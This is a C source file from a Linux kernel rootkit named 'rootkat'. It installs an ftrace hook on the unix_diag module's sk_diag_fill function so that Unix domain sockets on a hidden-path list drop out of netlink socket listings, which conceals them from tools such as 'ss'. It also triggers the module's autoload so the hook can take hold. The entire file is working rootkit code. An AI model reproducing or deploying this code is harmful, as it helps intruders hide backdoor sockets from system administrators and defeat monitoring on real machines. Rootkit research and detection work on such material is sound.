// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/skbuff.h>
#include <linux/un.h>
#include <linux/unix_diag.h>
#include <linux/user_namespace.h>
#include <net/af_unix.h>
#include <net/sock.h>
#include "ftrace_hook.h"
#include "kallsyms.h"
#include "hidden_unix_paths.h"
#include "hook_unix_diag.h"

#define TAG "rootkat/hook_unix_diag: "

typedef int (*sk_diag_fill_t)(struct sock *sk, struct sk_buff *skb,
                              struct unix_diag_req *req,
                              struct user_namespace *user_ns,
                              u32 portid, u32 seq, u32 flags, int sk_ino);

static int rootkat_unix_sk_diag_fill(struct sock *sk, struct sk_buff *skb,
                                     struct unix_diag_req *req,
                                     struct user_namespace *user_ns,
                                     u32 portid, u32 seq, u32 flags, int sk_ino);

/* Note: candidates is unused — we resolve via rootkat_lookup_in_module
 * because `sk_diag_fill` is a static name colliding across diag modules. */
static struct rootkat_hook hook_unix_diag = {
	.replacement = rootkat_unix_sk_diag_fill,
};

/*
 * Returning 0 without writing to skb signals "this socket was processed,
 * advance to the next" — the dump iterator continues and the netlink
 * response sees no entry for this socket. Mirrors the inet_sk_diag_fill
 * skip pattern.
 */
static int rootkat_unix_sk_diag_fill(struct sock *sk, struct sk_buff *skb,
                                     struct unix_diag_req *req,
                                     struct user_namespace *user_ns,
                                     u32 portid, u32 seq, u32 flags, int sk_ino)
{
	sk_diag_fill_t orig = (sk_diag_fill_t)hook_unix_diag.original;

	if (sk) {
		struct unix_sock *u = unix_sk(sk);
		struct unix_address *addr = u ? u->addr : NULL;

		if (addr && addr->len > (int)sizeof(short)) {
			unsigned int plen = addr->len - sizeof(short);

			if (rootkat_is_unix_path_hidden(addr->name->sun_path, plen))
				return 0;
		}
	}

	return orig(sk, skb, req, user_ns, portid, seq, flags, sk_ino);
}

int rootkat_hook_unix_diag_install(void)
{
	unsigned long addr;
	int rc;

	/* unix_diag, like inet_diag, is built as a module on Ubuntu
	 * (CONFIG_UNIX_DIAG=m). It autoloads when something opens a
	 * NETLINK_SOCK_DIAG socket for AF_UNIX (e.g. `ss -lx`). At our
	 * module_init time it isn't loaded; trigger autoload first. */
	rc = request_module("unix_diag");
	if (rc)
		pr_debug(TAG "request_module(unix_diag) returned %d (continuing)\n", rc);

	addr = rootkat_lookup_in_module("sk_diag_fill", "unix_diag");
	if (!addr) {
		pr_debug(TAG "sk_diag_fill not found in unix_diag\n");
		return -ENOENT;
	}

	return rootkat_hook_install_at(&hook_unix_diag, addr);
}

void rootkat_hook_unix_diag_remove(void)
{
	rootkat_hook_remove(&hook_unix_diag);
}
